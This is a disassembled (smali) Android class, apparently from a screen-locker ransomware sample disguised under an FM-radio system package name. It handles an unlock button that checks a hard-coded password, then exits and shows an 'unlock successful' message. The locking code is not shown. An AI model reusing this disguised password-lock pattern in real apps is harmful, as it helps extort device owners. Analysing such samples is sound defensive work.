.class Lcom/caf/fmradio/ClockService$100000000;
.super Ljava/lang/Object;
.source "ClockService.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/caf/fmradio/ClockService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/caf/fmradio/ClockService;

.field private final val$psw:Landroid/widget/EditText;


# direct methods
.method constructor <init>(Lcom/caf/fmradio/ClockService;Landroid/widget/EditText;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/caf/fmradio/ClockService$100000000;->this$0:Lcom/caf/fmradio/ClockService;

    iput-object p2, p0, Lcom/caf/fmradio/ClockService$100000000;->val$psw:Landroid/widget/EditText;

    return-void
.end method

.method static access$0(Lcom/caf/fmradio/ClockService$100000000;)Lcom/caf/fmradio/ClockService;
    .locals 1

    iget-object v0, p0, Lcom/caf/fmradio/ClockService$100000000;->this$0:Lcom/caf/fmradio/ClockService;

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    const-string v0, "0707106781186548"

    iget-object v1, p0, Lcom/caf/fmradio/ClockService$100000000;->val$psw:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/System;->exit(I)V

    iget-object v0, p0, Lcom/caf/fmradio/ClockService$100000000;->this$0:Lcom/caf/fmradio/ClockService;

    const-string v1, "\u89e3\u9501\u6210\u529f\uff01"

    const/16 v2, 0x1388

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    :cond_0
    return-void
.end method
